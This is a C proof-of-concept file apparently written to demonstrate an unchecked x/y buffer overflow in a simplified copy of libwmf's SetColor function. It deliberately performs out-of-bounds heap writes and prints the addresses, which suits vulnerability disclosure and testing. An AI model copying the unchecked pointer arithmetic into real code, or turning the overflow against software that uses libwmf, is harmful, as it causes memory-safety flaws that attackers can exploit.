// PoC for SetColor buffer overflow in libwmf
// Vulnerability: No bounds check on x/y parameters

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Simplified structures mimicking libwmf
typedef struct {
    unsigned char r, g, b;
} wmfRGB;

typedef struct {
    unsigned char* image;
    unsigned int bytes_per_line;
    unsigned int bits_per_pixel;
    unsigned int NColors;
    wmfRGB* rgb;
    int flipped;
} BMPData;

typedef struct {
    void* data;
    unsigned int width;
    unsigned int height;
} wmfBMP;

// Vulnerable function (simplified from bmp.h:1303)
void SetColor_vulnerable(wmfBMP* bmp, wmfRGB* rgb, unsigned int x, unsigned int y) {
    BMPData* data = (BMPData*)bmp->data;
    unsigned char* p;

    // No bounds check on x and y!
    switch (data->bits_per_pixel) {
    case 8:
        p = data->image + (y * data->bytes_per_line) + x;
        *p = 0xFF;  // Write to calculated pointer
        printf("[+] Wrote to address: %p (offset: %lu)\n",
               p, (unsigned long)(p - data->image));
        break;
    }
}

int main() {
    printf("=== PoC: SetColor Buffer Overflow ===\n\n");

    // Setup bitmap
    wmfBMP bmp;
    BMPData data;

    bmp.width = 100;
    bmp.height = 100;
    bmp.data = &data;

    data.bits_per_pixel = 8;
    data.bytes_per_line = 100;
    data.image = (unsigned char*)malloc(100 * 100);  // 10000 bytes
    data.flipped = 0;

    printf("[*] Allocated image buffer: %p (size: 10000 bytes)\n", data.image);
    printf("[*] Bitmap dimensions: %ux%u\n", bmp.width, bmp.height);
    printf("[*] bytes_per_line: %u\n\n", data.bytes_per_line);

    wmfRGB color = {255, 0, 0};

    // Normal access
    printf("[*] Test 1: Normal access (x=50, y=50)\n");
    SetColor_vulnerable(&bmp, &color, 50, 50);

    // Out-of-bounds access - beyond width
    printf("\n[*] Test 2: OOB access (x=200, y=50) - beyond width\n");
    SetColor_vulnerable(&bmp, &color, 200, 50);

    // Out-of-bounds access - beyond height
    printf("\n[*] Test 3: OOB access (x=50, y=200) - beyond height\n");
    SetColor_vulnerable(&bmp, &color, 50, 200);

    // Extreme out-of-bounds
    printf("\n[*] Test 4: Extreme OOB (x=1000, y=1000)\n");
    SetColor_vulnerable(&bmp, &color, 1000, 1000);

    printf("\n[!] If ASAN is enabled, you should see heap-buffer-overflow errors above\n");

    free(data.image);
    return 0;
}
